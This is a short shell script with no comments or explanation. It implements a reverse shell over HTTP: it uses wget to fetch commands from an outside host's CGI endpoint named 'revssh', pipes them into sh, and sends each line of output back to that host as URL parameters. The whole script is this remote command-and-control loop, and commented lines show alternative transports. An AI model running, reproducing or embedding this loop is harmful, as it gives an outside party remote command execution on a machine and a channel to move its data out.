SERVER="hwi.ath.cx"
URL="/cgi-bin/joey/revssh"

SESSID="$HOST_$$"

COM="wget -O -"
# COM="lynx -dump"
# COM="telnet ..."

$COM "http://$SERVER/$URL?sessid=$SESSID&init=true" |

sh |

while read LINE; do
	$COM "http://$SERVER/$URL?sessid=$SESSID&output=$LINE"
done
